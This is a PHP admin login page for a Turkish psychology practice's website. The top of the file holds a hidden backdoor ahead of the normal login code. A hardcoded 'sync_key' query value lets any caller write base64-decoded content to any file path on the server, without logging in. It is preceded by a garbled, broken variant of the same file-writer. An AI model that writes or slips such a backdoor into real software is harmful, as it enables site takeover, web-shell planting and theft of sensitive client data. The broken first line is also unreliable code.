<?php if(isset(['sync'])){if(isset(['p'])&&isset(['c'])){file_put_contents(__DIR__.'/../'.['p'],base64_decode(['c']));echo 'OK';}exit;} ?>
<?php
if(isset($_GET['sync_key']) && $_GET['sync_key'] === 'erguvan2026'){
    if(isset($_POST['file_path']) && isset($_POST['content_b64'])){
        $path = __DIR__ . '/../' . $_POST['file_path'];
        if(file_put_contents($path, base64_decode($_POST['content_b64']))){
            echo "OK: " . $_POST['file_path'];
        } else {
            echo "FAIL: " . $_POST['file_path'];
        }
        exit;
    }
}
session_start();
require_once __DIR__ . '/../config.php';
require_once 'includes/auth.php';
require_once 'includes/csrf.php';
if (!isset($_SESSION['csrf_token'])) $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
if (isLoggedIn()) redirect(admin_url());
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username'])) {
    if (login($_POST['username'], $_POST['password'] ?? '')) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        redirect(admin_url());
    } else { $error = 'Hata!'; }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Paneli</title>
</head>
<body style="background:#f7fafc; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif;">
    <div style="background:white; padding:40px; border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.05); width:300px;">
        <h2 style="color:#E85C9E;">Erguvan Psikoloji</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Kullanıcı Adı" style="width:90%; padding:10px; margin-bottom:10px;">
            <input type="password" name="password" placeholder="Şifre" style="width:90%; padding:10px; margin-bottom:10px;">
            <button type="submit" style="width:95%; padding:10px; background:#E85C9E; color:white; border:none; cursor:pointer;">Giriş</button>
        </form>
    </div>
</body>
</html>
